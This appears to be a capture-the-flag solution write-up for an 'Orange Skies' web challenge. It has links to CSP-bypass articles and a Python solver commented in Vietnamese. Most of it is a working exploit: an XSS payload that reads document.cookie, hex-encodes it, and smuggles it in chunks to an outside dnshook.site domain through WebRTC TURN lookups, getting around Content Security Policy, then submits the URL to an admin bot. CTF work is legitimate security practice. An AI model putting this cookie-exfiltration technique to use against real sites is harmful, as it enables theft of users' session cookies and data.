solver: lilsadfoqs - will update full explaination real quick later :Đ

![image](https://github.com/user-attachments/assets/567bc3cd-eb20-4371-9f0e-29b69dcbafd0)
![image-1](https://github.com/user-attachments/assets/a6864e46-d7e6-4f7b-843c-3b78c1bef6f6)
[Bypassing Your Defenses: Common CSP Bypasses | Beyond XSS](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
![image](https://github.com/user-attachments/assets/4d797abe-0816-4735-bfb8-cc1037ecb394)
https://4xura.com/web/how-to-bypass-csp-in-xss-attack/
![image](https://github.com/user-attachments/assets/ebb634ab-44e7-4a14-b3e4-aaa2cc815782)
```python
#!/usr/bin/env python3
import time
import urllib.parse
import requests

ADMIN_BASE = "https://web-orange-skies-5vkzzz88.amt.rs"
VICTIM_ORIGIN = "https://orange-skies-amateurs-ctf-2025.pages.dev"
DNS_DOMAIN = "2658cb2c-5772-474d-bfb3-bb369df50f84.dnshook.site"

NUM_SEGMENTS = 3          # chia flag thành 3 đoạn
RUNS_PER_SEGMENT = 3      # mỗi đoạn: 3 lần bot visit
REPEAT_PER_VISIT = 3      # mỗi visit: bắn DNS 3 lần
COOLDOWN_SLEEP = 32       # chờ 32s giữa các lần submit
CHUNK_HEX_LEN = 30        # mỗi segment dài 30 hex

def build_js_payload(segment_index: int) -> str:
    # JS tối giản, không dùng f-string {} cho đỡ lỗi
    js_template = r"""
(async()=>{try{
const m=document.cookie.match(/FLAG=([^;]+)/);
const f=m?m[1]:document.cookie;
let h="";
for(let i=0;i<f.length;i++){
  const c=f.charCodeAt(i).toString(16);
  h+=("0"+c).slice(-2);
}
const d="DNS_DOMAIN";
const seg=SEG_INDEX;
const len=CHUNK_LEN;
const rep=REPEAT_COUNT;
const start=seg*len;
const chunk=h.slice(start,start+len);
if(!chunk)return;
for(let k=0;k<rep;k++){
  const host=chunk+"."+d;
  const pc=new RTCPeerConnection({iceServers:[{urls:["turn:"+host+":3478?transport=udp"],username:"x",credential:"x"}]});
  pc.createDataChannel("x");
  const o=await pc.createOffer();
  await pc.setLocalDescription(o);
  await new Promise(r=>setTimeout(r,300));
}
}catch(e){}})();
""".strip()

    js = (
        js_template
        .replace("DNS_DOMAIN", DNS_DOMAIN)
        .replace("SEG_INDEX", str(segment_index))
        .replace("CHUNK_LEN", str(CHUNK_HEX_LEN))
        .replace("REPEAT_COUNT", str(REPEAT_PER_VISIT))
    )
    return js

def main():
    print("[*] Segmented DNS exfil for Orange Skies")
    print(f"[*] Admin base:        {ADMIN_BASE}")
    print(f"[*] Victim origin:     {VICTIM_ORIGIN}")
    print(f"[*] DNS domain:        {DNS_DOMAIN}")
    print(f"[*] Segments:          {NUM_SEGMENTS}")
    print(f"[*] Runs/segment:      {RUNS_PER_SEGMENT}")
    print(f"[*] DNS repeats/visit: {REPEAT_PER_VISIT}")
    print(f"[*] Hex length/segment:{CHUNK_HEX_LEN}")
    print(f"[*] Cooldown sleep:    {COOLDOWN_SLEEP}s\n")

    submit_url = f"{ADMIN_BASE}/submit"

    total_runs = NUM_SEGMENTS * RUNS_PER_SEGMENT
    run_idx = 0

    for seg in range(NUM_SEGMENTS):
        for run in range(RUNS_PER_SEGMENT):
            run_idx += 1
            print(f"[+] Segment {seg+1}/{NUM_SEGMENTS}, visit {run+1}/{RUNS_PER_SEGMENT} (global {run_idx}/{total_runs})")

            js_payload = build_js_payload(seg)
            xss_param = urllib.parse.quote(js_payload, safe="")
            target_url = f"{VICTIM_ORIGIN}/?xss={xss_param}"

            print(f"    URL bot sẽ visit:")
            print(f"    {target_url}\n")

            data = {"url": target_url}
            try:
                resp = requests.post(submit_url, data=data, timeout=10)
                print(f"    POST -> {submit_url}, status = {resp.status_code}")
                print(f"    Body: {resp.text!r}")
            except Exception as e:
                print(f"    Lỗi request: {e}")

            if run_idx < total_runs:
                print(f"    Ngủ {COOLDOWN_SLEEP}s rồi bắn tiếp...\n")
                time.sleep(COOLDOWN_SLEEP)

    print("\n[*] Done. Vào dnshook xem các subdomain dạng:")
    print(f"    <hex_chunk>.{DNS_DOMAIN}")
    print("    Segment 0 ~ offset 0–29, segment 1 ~ 30–59, segment 2 ~ 60–89 của hex.")
    print("    Ghép các chunk khác nhau lại theo thứ tự seg0→seg1→seg2, decode hex → flag.\n")

if __name__ == "__main__":
    main()
```

